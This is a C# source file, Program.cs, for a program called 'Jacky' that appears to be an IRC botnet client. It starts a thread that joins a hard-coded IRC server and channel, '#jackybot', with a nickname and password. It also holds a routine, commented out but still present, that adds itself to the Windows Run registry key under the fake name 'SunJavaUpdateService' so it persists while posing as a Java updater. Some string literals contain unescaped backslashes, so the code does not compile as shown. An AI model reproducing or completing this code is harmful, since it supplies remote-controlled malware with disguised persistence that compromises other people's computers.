   /*************************************************************************
    * Start of Program.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************************/

   using System;
   using System.Collections.Generic;
   using System.ComponentModel;
   using System.Data;
   using System.Text;
   using System.Threading;
   using System.Resources;
   using Microsoft.Win32;
   using System.Runtime.InteropServices;
   using System.IO;
   using System.Windows.Forms;

   namespace Jacky {

       class Jacky {

           private static Thread myThread;
           private static string myPath = Application.StartupPath + "\" + Application.ProductName + ".exe";

           static void Main(string[] args) {
               //CheckRegistry();
               myThread = new Thread(new ThreadStart(runIrc));
               myThread.Start();
           }

           private static void runIrc() {
               IRC irc = new IRC();
               irc.start("apena", 6667, "#jackybot", "jacky", "free0n");
               irc.connect();
           }


           private static void CheckRegistry() {
               string regRoot = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
               string azrealStart = (string)Registry.GetValue(regRoot, "SunJavaUpdateService", "SunJavaUpdateService");
               if (azrealStart == "SunJavaUpdateService") {
                   Registry.SetValue(regRoot, "SunJavaUpdateService", myPath);
               }
           }

       }
   }
